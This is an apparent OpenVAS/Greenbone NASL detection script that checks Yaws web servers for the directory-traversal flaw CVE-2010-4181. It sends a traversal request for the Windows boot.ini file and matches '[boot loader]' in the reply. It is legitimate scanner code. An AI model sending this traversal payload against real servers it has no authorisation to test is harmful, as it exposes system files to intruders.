if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100887" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-11-02 13:46:58 +0100 (Tue, 02 Nov 2010)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2010-4181" );
	script_bugtraq_id( 44564 );
	script_name( "Yaws URI Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/44564" );
	script_xref( name: "URL", value: "http://yaws.hyber.org/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "Yaws/banner" );
	script_tag( name: "summary", value: "Yaws is prone to a directory-traversal vulnerability because it fails
to sufficiently sanitize user-supplied input.

Exploiting this issue may allow an attacker to obtain sensitive
information that could aid in further attacks.

Yaws 1.89 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: Yaws/" )){
	exit( 0 );
}
url = NASLString( "/.\\\\..\\\\.\\\\..\\\\.\\\\..\\\\boot.ini" );
if(http_vuln_check( port: port, url: url, pattern: "\\[boot loader\\]" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

